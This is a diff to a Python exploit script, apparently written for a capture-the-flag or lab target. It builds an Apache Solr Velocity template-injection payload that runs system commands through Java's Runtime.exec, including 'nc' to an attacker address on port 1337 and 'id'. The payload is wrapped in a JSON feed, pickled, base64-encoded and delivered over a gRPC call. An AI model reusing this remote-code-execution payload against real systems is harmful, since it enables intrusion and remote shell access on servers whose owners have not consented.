@@ -24,17 +24,19 @@ import json
 import pickle
 
 def make_data(port):
-    p = '{"version": "v1.0",' \
-        '"title": "Printer Feed",' \
-        '"home_page_url": "http://localhost:' + port + '/",' \
-        '"feed_url": "http://10.10.14.27:1337/feeds.json",' \
-        '"items":' \
-            ' [{"id": "2",' \
-                '"content_text": "Queue jobs"},' \
-            '{"id": "1",' \
-                '"content_text": "Failed item"}]' \
-        '}'
+    url = ("/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
+            "%23set($x=%27%27)+"
+            "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
+            "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
+            "%23set($str=$x.class.forName(%27java.lang.String%27))+"
+            "%23set($ex=$rt.getRuntime().exec(%27" + "nc%2010.10.14.27%201337" +
+            "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
+            "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
+    inj = 'String[] commands = new String[]{"nc", "localhost", "8080"};Process childProc = Runtime.getRuntime().exec(command);InputStream in = childProc.getInputStream();int c;while ((c = in.read()) != -1) {System.out.print((char)c);}in.close();'
 
+    url = "/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+
+    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:' + port + url + '","feed_url": "http://localhost:' + port +'/feeds.json"}'
     # For storing 
     p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
     p = base64.b64encode(p)
@@ -59,7 +61,7 @@ def run(t):
         stub = s_pb2_grpc.PrintStub(channel)
 
         d = s_pb2.Content(
-                    data = t,
+                data = t,
                 )
 
         response = stub.Feed(d)
